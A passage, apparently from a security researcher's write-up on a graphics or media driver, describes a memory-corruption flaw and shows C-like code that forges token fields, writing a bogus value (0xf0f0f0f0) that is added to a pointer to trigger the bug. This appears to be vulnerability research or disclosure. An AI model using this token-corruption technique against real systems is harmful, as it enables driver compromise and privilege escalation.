...
but notice that there is possibility for memory corruption here as at the end of the loop the byte at r14 is AND'd with 0xfa allowing
you to clear two bits.
  ...
  if (selector == 2 && connection == port){
    if (token_buf != 0){
      ...
      if (tok && count++ > 10){
        ...
        *tok = 0x00288200; // AllPostProcGVA
        tok[0x8/4] = tok[0x1c/4];  // copy the right resource handles from the MediaKernel token
        tok[0x10/4] = 0x0;  // skip over this bug
        
        tok[0xc/4] = tok[0x20/4];  // copy the right resource handles from the MediaKernel token
        tok[0x14/4] = 0xf0f0f0f0;  // hit this bug, added to a valid pointer and passed to patch_vphal_ssh_instance
      }
    }
  }
